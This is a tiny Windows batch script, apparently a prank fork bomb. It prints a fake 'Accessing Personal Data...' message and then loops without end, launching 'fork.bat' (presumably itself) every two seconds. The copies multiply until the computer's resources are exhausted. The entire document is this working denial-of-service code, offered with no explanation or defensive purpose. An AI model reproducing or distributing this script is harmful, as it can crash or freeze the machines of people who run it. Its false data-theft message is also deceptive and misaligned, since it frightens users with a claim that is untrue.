@ECHO OFF
color 0a
echo Accessing Personal Data...
Pushd"%~dp0"
:a
title Win%random%a
timeout /t 2 /nobreak >nul
start fork.bat
goto a